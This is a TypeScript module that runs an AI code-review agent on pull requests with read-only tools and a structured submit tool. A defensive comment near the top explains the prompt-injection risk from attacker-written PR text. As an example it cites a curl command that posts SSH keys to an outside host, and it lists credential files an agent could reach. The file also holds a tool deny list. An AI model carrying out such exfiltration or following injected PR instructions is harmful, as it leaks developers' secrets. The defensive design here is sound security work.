import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  createSdkMcpServer,
  query,
  tool,
  type SDKResultMessage,
} from '@anthropic-ai/claude-agent-sdk';
import type { ClaudeFindingSide } from '@pierre-review/shared';
import type {
  ReviewFinding,
  RunReviewArgs,
  RunReviewResult,
} from '../pro/contract.js';
import { config } from '../config.js';
import { submitReviewShape, type SubmitReviewPayload } from './schema.js';
import { applyClaudeReviewAuth } from './auth.js';
import { getEffectiveReviewBudget } from './local-settings.js';
import {
  cleanupCloneCache,
  prepWorktree,
  removeWorktreeLocked,
} from './clone-manager.js';
import { buildAnchorIndex, extractHunk, isFindingAnchored } from './post-review.js';
import { estimateCostUsd } from './pricing.js';
import {
  recordUsage,
  sumModelUsage,
  sumUsageMap,
  type UsageTokens,
} from './usage.js';

// The security-sensitive HALF of ctx.review.runReview (the plugin owns routing/prompts/
// persistence; core owns the SDK run). Given a resolved mode + the plugin-built prompts +
// the stripped diff (for anchoring), it clones/worktrees, runs the Agent SDK with the
// in-process submit_review MCP tool, applies the auth env policy, streams progress, anchors
// the findings, and RETURNS the structured result — it never touches the DB or throws for
// an expected failure (it returns { submitted:false } / { aborted:true } with telemetry).

// Read-only tool surface for a WORKTREE review. submit_review is the ONLY way structured
// output leaves the agent.
//
// ---- Bash is deliberately ABSENT (this used to include it) ----
//
// A code review is the textbook prompt-injection target: every byte the model reads — the PR
// title, the description, the diff, the review comments — was written by whoever opened the pull
// request, which on a public repo is anyone. Combine that untrusted instruction channel with
// `permissionMode: 'bypassPermissions'` (below) and a shell, and the review agent becomes a
// remote code-execution path on the developer's own machine, with their `gh` token, SSH keys,
// `~/.aws/credentials` and `.env` files all in reach and `curl` available to post them onwards.
//
// The old `DISALLOWED_TOOLS` blocklist (`Bash(rm *)`, `Bash(sudo *)`, …) was never a defence
// against that. It stops a handful of literal command prefixes; it does nothing about
// `curl -d @~/.ssh/id_rsa https://…`, `python -c …`, or any of the thousand equivalent spellings.
// A blocklist cannot enumerate the badness of a shell.
//
// What Bash bought was `git log` / `git show` for extra context, and the prompt already told the
// agent to "prefer the dedicated Read/Glob/Grep tools over shelling out" — so this trades a
// modest amount of optional context for closing arbitrary command execution driven by a stranger's
// pull-request text. Read/Glob/Grep remain, which is what actually reviews code.
//
// If shell access is ever genuinely needed here, the way back is a container/VM boundary or an
// explicit `canUseTool` allowlist under a non-bypass permission mode — NOT re-adding 'Bash' with
// a longer blocklist.
const WORKTREE_TOOLS = ['Read', 'Glob', 'Grep', 'mcp__review__submit_review'];
// A DIFF-ONLY review is tool-less: the agent has the full diff in its prompt and no
// repository to explore, so submit_review is the only tool it gets.
const DIFF_ONLY_TOOLS = ['mcp__review__submit_review'];
// Models that accept the `effort` option. Haiku 4.5 rejects it (the API 400s), so it runs
// without an effort hint — its low per-token price is its cost lever instead.
const EFFORT_CAPABLE_MODELS: ReadonlySet<string> = new Set([
  'claude-sonnet-5',
  'claude-opus-4-8',
  'claude-sonnet-4-6',
]);
// Deny list. `Bash` is denied OUTRIGHT rather than by command pattern — see WORKTREE_TOOLS
// above for why a per-command blocklist is not a security boundary when the model's input is
// attacker-authored. Belt and braces: Bash is also absent from the allow list, so this is the
// second of two independent reasons it cannot run.
const DISALLOWED_TOOLS = [
  'Write',
  'Edit',
  'MultiEdit',
  'NotebookEdit',
  'Bash',
  'WebFetch',
  'WebSearch',
];

// How many recent-activity lines to keep in the live progress ring buffer.
const ACTIVITY_LOG_CAP = 25;

export async function runReview(args: RunReviewArgs): Promise<RunReviewResult> {
  const { model, mode, onProgress, abortController } = args;

  let worktreePath: string | null = null;
  let repoCloneDir: string | null = null;
  let tempCwd: string | null = null;
  let result: SDKResultMessage | null = null;
  let restoreEnv: (() => void) | null = null;
  // Per-message usage keyed by message UUID (latest-wins): the SDK re-emits a message per
  // turn, so a naive SUM double-counts (~2×). The PERSISTED totals prefer the result
  // message's authoritative `modelUsage` (see telemetry()).
  const usageByUuid = new Map<string, UsageTokens>();
  const telemetry = (): Pick<
    RunReviewResult,
    'costUsd' | 'inputTokens' | 'outputTokens' | 'cacheReadTokens' | 'cacheCreationTokens' | 'numTurns'
  > => {
    const usage = sumModelUsage(result) ?? sumUsageMap(usageByUuid);
    const hasUsage = usage.inputTokens + usage.outputTokens + usage.cacheReadTokens > 0;
    return {
      costUsd: result?.total_cost_usd ?? (hasUsage ? estimateCostUsd(model, usage) : null),
      inputTokens: usage.inputTokens,
      outputTokens: usage.outputTokens,
      cacheReadTokens: usage.cacheReadTokens,
      cacheCreationTokens: usage.cacheCreationTokens,
      numTurns: result?.num_turns ?? null,
    };
  };
  const fail = (failureReason: string | undefined, aborted: boolean): RunReviewResult => ({
    submitted: false,
    failureReason,
    scope: null,
    summary: '',
    verdict: 'COMMENT',
    findings: [],
    ...telemetry(),
    aborted,
  });

  try {
    // Working directory + tool surface per mode. A worktree review clones + checks out the
    // head and gets the read-only file tools; a diff-only review is TOOL-LESS with a
    // throwaway cwd and NO clone (the dominant per-run cost) — the whole change is in its prompt.
    let cwd: string;
    let allowedTools: string[];
    let maxTurns: number;
    if (mode === 'worktree') {
      onProgress({ phase: 'cloning', reviewMode: mode });
      ({ repoCloneDir, worktreePath } = await prepWorktree(
        args.owner,
        args.name,
        args.prNumber,
        args.headSha,
      ));
      cwd = worktreePath;
      allowedTools = WORKTREE_TOOLS;
      maxTurns = config.reviewMaxTurns;
    } else {
      tempCwd = mkdtempSync(join(tmpdir(), 'pierre-review-'));
      cwd = tempCwd;
      allowedTools = DIFF_ONLY_TOOLS;
      maxTurns = config.reviewDiffOnlyMaxTurns;
    }
    // Haiku reaches a verdict in more steps than Sonnet/Opus; give it proportionally more
    // turns (cheap at its token price; maxBudgetUsd remains the spend guard).
    if (model === 'claude-haiku-4-5') {
      maxTurns = Math.ceil(maxTurns * config.reviewHaikuTurnMultiplier);
    }
    // Effort guides thinking depth + token spend — the dominant cost knob. Per-mode, and only
    // for models that accept it (Haiku rejects `effort`; it runs unset).
    const effort = EFFORT_CAPABLE_MODELS.has(model)
      ? mode === 'diff_only'
        ? config.reviewDiffOnlyEffort
        : config.reviewEffort
      : undefined;

    // Establish this run's auth (prefer ambient, strip an explicit key). The plugin decides
    // whether it's safe to mutate process.env (its concurrency === 1); restored in finally.
    restoreEnv = applyClaudeReviewAuth(args.applyAuthEnv);

    // ---- run the agent ----
    let captured: SubmitReviewPayload | null = null;
    const server = createSdkMcpServer({
      name: 'review',
      version: '1.0.0',
      tools: [
        tool(
          'submit_review',
          'Submit your structured review. Call this EXACTLY once, at the end.',
          submitReviewShape,
          async (a) => {
            captured = a as unknown as SubmitReviewPayload;
            return { content: [{ type: 'text', text: 'Review recorded.' }] };
          },
        ),
      ],
    });

    const q = query({
      prompt: args.prompt,
      options: {
        model,
        ...(effort ? { effort } : {}),
        systemPrompt: args.systemPrompt,
        cwd,
        permissionMode: 'bypassPermissions',
        allowedTools,
        disallowedTools: DISALLOWED_TOOLS,
        maxTurns,
        // User-set per-review cap (local settings) when present, else the operator default.
        maxBudgetUsd: getEffectiveReviewBudget(),
        // Don't inherit the host's .claude settings / CLAUDE.md / skills.
        settingSources: [],
        mcpServers: { review: server },
        abortController,
      },
    });

    // Rolling, newest-last log of what the agent is doing right now, surfaced via onProgress.
    const activity: string[] = [];
    const pushActivity = (line: string): void => {
      const trimmed = line.trim();
      if (!trimmed) return;
      activity.push(trimmed);
      if (activity.length > ACTIVITY_LOG_CAP) activity.shift();
    };

    // Flip to 'reviewing' the moment setup is done — BEFORE the first model token — so the
    // prior phase doesn't linger through the agent's whole first turn.
    onProgress({ phase: 'reviewing', reviewMode: mode });

    for await (const message of q) {
      if (message.type === 'assistant') {
        try {
          recordUsage(usageByUuid, message);
        } catch {
          /* usage shape varies — never let it break the run */
        }
        try {
          for (const line of describeAssistantBlocks(message)) pushActivity(line);
        } catch {
          /* never let progress derivation break the run */
        }
        const live = sumUsageMap(usageByUuid);
        onProgress({
          phase: 'reviewing',
          recentActivity: [...activity],
          reviewMode: mode,
          usage: { ...live, estCostUsd: estimateCostUsd(model, live) },
        });
      } else if (message.type === 'result') {
        result = message;
      }
    }

    if (!captured) {
      const reason =
        result && result.subtype !== 'success'
          ? `agent stopped (${result.subtype}) without submitting a review`
          : 'agent finished without calling submit_review';
      return fail(reason, false);
    }

    // ---- anchor ----
    const payload: SubmitReviewPayload = captured;
    const index = buildAnchorIndex(args.strippedDiff);
    const findings: ReviewFinding[] = payload.findings.map((f) => {
      const side: ClaudeFindingSide = f.side === 'LEFT' ? 'LEFT' : 'RIGHT';
      const line = f.line ?? null;
      return {
        path: f.path,
        line,
        side,
        severity: f.severity,
        title: f.title,
        body: f.body,
        suggestion: f.suggestion ?? null,
        diffHunk: extractHunk(args.strippedDiff, f.path, line, side),
        anchored: isFindingAnchored(index, f.path, line, side),
        // Whether the file is part of the PR diff at all — distinguishes an unanchored
        // finding that posts inline on the file's first change from one that posts PR-level.
        fileInDiff: index.has(f.path),
      };
    });

    return {
      submitted: true,
      scope: payload.scopeUsed,
      summary: payload.summary,
      verdict: payload.verdict,
      findings,
      ...telemetry(),
      aborted: false,
    };
  } catch (err) {
    // A user cancel aborts the SDK iterator, surfacing as an error here.
    if (abortController.signal.aborted) return fail(undefined, true);
    return fail(errorMessage(err), false);
  } finally {
    restoreEnv?.();
    if (repoCloneDir && worktreePath) {
      await removeWorktreeLocked(args.owner, args.name, repoCloneDir, worktreePath).catch(
        () => {},
      );
    }
    // Diff-only runs use a throwaway cwd — remove it (best-effort).
    if (tempCwd) {
      try {
        rmSync(tempCwd, { recursive: true, force: true });
      } catch {
        /* advisory cleanup — never surface */
      }
    }
    // Only a worktree run touched the clone cache. Defer LRU eviction (fire-and-forget) so
    // the review result returns promptly; cleanupCloneCache is best-effort and never throws.
    if (repoCloneDir) {
      setImmediate(() => {
        try {
          cleanupCloneCache();
        } catch {
          /* advisory cleanup — never surface */
        }
      });
    }
  }
}

function errorMessage(err: unknown): string {
  if (err instanceof Error) return err.message;
  return String(err);
}

const TEXT_SNIPPET_CAP = 120;
const BASH_CMD_CAP = 80;

/**
 * Turn one assistant message into a few short, human-readable progress lines: a label per
 * tool_use block plus a clipped snippet of any assistant text. Defensive throughout — the
 * SDK content/tool-input shapes vary, so every access is guarded and this never throws.
 */
function describeAssistantBlocks(message: unknown): string[] {
  const lines: string[] = [];
  const content = (message as { message?: { content?: unknown } })?.message?.content;
  if (!Array.isArray(content)) return lines;

  for (const raw of content) {
    if (!raw || typeof raw !== 'object') continue;
    const block = raw as { type?: unknown; name?: unknown; input?: unknown; text?: unknown };

    if (block.type === 'tool_use') {
      const name = typeof block.name === 'string' ? block.name : 'Tool';
      const input =
        block.input && typeof block.input === 'object'
          ? (block.input as Record<string, unknown>)
          : {};
      lines.push(labelToolUse(name, input));
    } else if (block.type === 'text' && typeof block.text === 'string') {
      const snippet = clip(block.text.replace(/\s+/g, ' ').trim(), TEXT_SNIPPET_CAP);
      if (snippet) lines.push(snippet);
    }
  }
  return lines;
}

/** Build a short label for a tool call from its name + a truncated first arg. */
function labelToolUse(name: string, input: Record<string, unknown>): string {
  const str = (v: unknown): string | null =>
    typeof v === 'string' && v.trim().length > 0 ? v.trim() : null;

  switch (name) {
    case 'Read': {
      const p = str(input.file_path) ?? str(input.path);
      return p ? `Read ${p}` : 'Read …';
    }
    case 'Glob': {
      const p = str(input.pattern);
      return p ? `Glob ${p}` : 'Glob …';
    }
    case 'Grep': {
      const p = str(input.pattern);
      return p ? `Grep "${clip(p, BASH_CMD_CAP)}"` : 'Grep …';
    }
    case 'Bash': {
      const c = str(input.command);
      return c ? `Bash ${clip(c, BASH_CMD_CAP)}` : 'Bash …';
    }
    case 'mcp__review__submit_review':
      return 'Submitting review…';
    default: {
      for (const key of Object.keys(input)) {
        const v = str(input[key]);
        if (v) return `${name} ${clip(v, BASH_CMD_CAP)}`;
      }
      return `${name} …`;
    }
  }
}

function clip(s: string, max: number): string {
  return s.length > max ? `${s.slice(0, max)}…` : s;
}
